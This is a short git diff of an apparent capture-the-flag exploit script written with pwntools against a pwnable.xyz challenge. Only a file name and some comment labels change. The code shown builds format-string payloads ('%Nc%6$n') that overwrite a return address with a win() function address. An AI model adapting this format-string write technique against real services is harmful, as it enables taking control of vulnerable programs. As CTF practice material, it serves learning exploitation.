@@ -2,7 +2,7 @@ from pwn import *
 
 # context.log_level = 'debug'
 
-# p = process('./challenge', aslr=False)
+# p = process('./fsboo', aslr=False)
 p = remote("svc.pwnable.xyz", 30010)
 
 # gdb.attach(p, """ b* vuln+41""")
@@ -54,14 +54,14 @@ for i in range(10):
 win_addr_a = win_addr & 0xffff # win() High Address
 win_addr_b = (win_addr >> 16) & 0xffff # win() Low Address
     
-#5.1 Insert win() High address
+# Insert win() High address
 payload = "%"+str(win_addr_a-12)+"c%6$n\x00"
 p.sendlineafter('> ', str(tmp_1))
 p.recvuntil('Name: ')
 p.send(payload)
 p.sendlineafter('> ', str(vuln_ret-0x100000000))
 
-#5.2 Insert win() Low address
+# Insert win() Low address
 payload = "%"+str(win_addr_b-12)+"c%6$n\x00"
 p.sendlineafter('> ', str(tmp_1))
 p.recvuntil('Name: ')
